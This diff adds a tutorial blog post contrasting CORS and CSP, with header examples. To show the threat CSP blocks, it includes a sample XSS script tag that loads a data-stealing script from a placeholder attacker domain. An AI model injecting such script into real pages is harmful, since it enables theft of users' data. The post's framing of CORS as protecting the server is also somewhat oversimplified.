@@ -1,0 +1,92 @@
+---
+title: 'CORS vs. CSP: A Simple Guide'
+date: '2025-09-06'
+tags: ['security', 'webdev']
+summary: 'A clear breakdown of CORS and CSP, explaining how they protect your server and users with practical examples.'
+---
+
+## What's the Difference Between CORS and CSP?
+
+When building for the web, you'll often encounter two critical security policies: CORS and CSP. They sound similar, but they serve very different purposes. Let's break down what they do and why you need them.
+
+> **CORS (Cross-Origin Resource Sharing)** protects your **server**. It's a permission slip from your server that tells a browser, "It's okay for that other website to request and read my data."
+>
+> It answers the question: **"Who is allowed to read my data?"**
+
+> **CSP (Content Security Policy)** protects your **users**. It's a whitelist you create for your website that tells a browser, "Only load scripts, styles, and images from these specific, trusted sources."
+>
+> It answers the question: **"What content is safe to run on my page?"**
+
+---
+
+## Example: CORS in Action
+
+Imagine your web application is split into two parts:
+
+-   **Frontend**: A React app running on `https://my-cool-app.com`.
+-   **Backend API**: A server with data and logic running on `https://api.data-service.com`.
+
+A user clicks a button on your site, and the frontend needs to fetch data by calling the backend API at `https://api.data-service.com/users/123`.
+
+### Without CORS
+
+The browser, enforcing a security rule called the **Same-Origin Policy**, blocks the request because it comes from a different domain. This policy prevents a web page from making requests to a different origin by default. As a result, you'll see a CORS error in your developer console, and the app won't get the data it needs.
+
+### With CORS
+
+To fix this, the backend team adds a CORS rule. Now, when the server responds, it includes an HTTP header that acts as a permission slip:
+
+```http
+Access-Control-Allow-Origin: https://my-cool-app.com
+```
+
+The browser sees this header, understands that `api.data-service.com` trusts `my-cool-app.com`, and allows the request to proceed. The data is fetched successfully.
+
+---
+
+## Example: CSP in Action
+
+Imagine you run a popular blog at `https://my-secure-blog.com`. You want to protect your users from **Cross-Site Scripting (XSS)** attacks, where an attacker might inject malicious code into your comments section.
+
+Your website needs to:
+
+-   Load its own JavaScript and CSS.
+-   Load a Google Analytics script to track visitors.
+-   Load images from a trusted CDN.
+
+### The Problem
+
+A hacker posts a comment that includes a malicious script tag:
+
+```html
+<script src="https://malicious-site.com/steal-user-info.js"></script>
+```
+
+Without CSP, a user's browser would blindly load and execute this script, potentially stealing their data.
+
+### With CSP
+
+You configure your web server to send a `Content-Security-Policy` HTTP header with every page:
+
+```http
+Content-Security-Policy:
+  script-src 'self' https://www.google-analytics.com;
+  img-src 'self' https://cdn.my-images.com;
+  style-src 'self';
+```
+
+This policy instructs the browser:
+-   **`script-src`**: Only execute scripts from our own domain (`'self'`) and Google Analytics.
+-   **`img-src`**: Only load images from our own domain and our trusted CDN.
+-   **`style-src`**: Only load stylesheets from our own domain.
+
+Now, when the browser sees the malicious script tag, it checks the `script-src` policy. Since `https://malicious-site.com` is not on the whitelist, the browser **refuses to load or execute the script**. The attack is stopped, and your users remain safe.
+
+---
+
+## Summary
+
+In short, the two policies protect different parts of your application:
+
+-   **CORS** protects your **server** by controlling which other sites can **request** its data.
+-   **CSP** protects your **users** by controlling what content can **run** on your website.
